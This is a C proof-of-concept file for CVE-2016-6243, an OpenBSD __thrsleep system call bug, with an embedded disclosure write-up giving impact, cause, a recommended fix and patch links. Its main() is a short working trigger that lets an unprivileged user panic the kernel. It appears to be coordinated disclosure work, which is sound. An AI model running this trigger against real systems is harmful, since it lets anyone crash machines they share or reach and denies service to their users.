/*
 * thrsleep_panic.c
 *    Demonstrate a panic through the __thrsleep system call.
 *
 * gcc -g thrsleep_panic.c -o thrsleep_panic
 */

#ifdef BUG_WRITEUP //---------------------------------------------------
__thrsleep validation is insufficient and can lead to a panic.

Impact: 
Any user can panic the OpenBSD kernel with the __thrsleep system call.

Description:
The __thrsleep system call allows a user to sleep for some amount
of time.  The system call validates the user-provided parameters
in thrsleep() (kern/kern_synch.c) before calling to lower layers
to implement the sleep:

        if (timespeccmp(tsp, &now, <)) {
            /* already passed: still do the unlock */
            if ((error = thrsleep_unlock(lock, lockflags)))
                return (error);
            return (EWOULDBLOCK);
        }

        timespecsub(tsp, &now, tsp);
        to_ticks = (long long)hz * tsp->tv_sec +
            (tsp->tv_nsec + tick * 1000 - 1) / (tick * 1000) + 1;
        if (to_ticks > INT_MAX)
            to_ticks = INT_MAX;

This validation is insufficient.  Some values of the user-provided
tsp can be in the future and still lead to a negative to_ticks value
after conversion.  This condition triggers a panic in timeout_add 
(kern/kern_timeout.c) when the to_ticks value is checked to be positive:

        if (to_ticks < 0)
            panic("timeout_add: to_ticks (%d) < 0", to_ticks);

Reproduction:
Run the attached thrsleep_panic.c program.  NCC verified that
it causes a panic on OpenBSD 5.9 GENERIC kernel on an x86_64 processor.

Recommendation:
Check to see if to_ticks is negative in thrsleep (kern/kern_synch.c) and, 
if so, saturate its value at INT_MAX, since this indicates an overly 
large value.

Reported: 2016-06-29
Fixed:    http://cvsweb.openbsd.org/cgi-bin/cvsweb/src/sys/kern/kern_synch.c?rev=1.132&content-type=text/x-cvsweb-markup
          http://ftp.openbsd.org/pub/OpenBSD/patches/5.9/common/018_timeout.patch.sig
          http://ftp.openbsd.org/pub/OpenBSD/patches/5.8/common/021_timeout.patch.sig
Assigned: CVE-2016-6243
#endif // BUG_WRITEUP ---------------------------------------------------

#include <stdio.h>
#include <sys/time.h>

int __thrsleep(const volatile void *id, clockid_t clock_id, const struct timespec *abstime, void *lock, const int *abort);

int
main(int argc, char **argv)
{
    struct timespec tsp = { 0x7000000000000000LL, 0 };
    int waitchan;

    __thrsleep(&waitchan, CLOCK_REALTIME, &tsp, NULL, NULL);
    printf("nothing happened!\n");
    return 0;
}

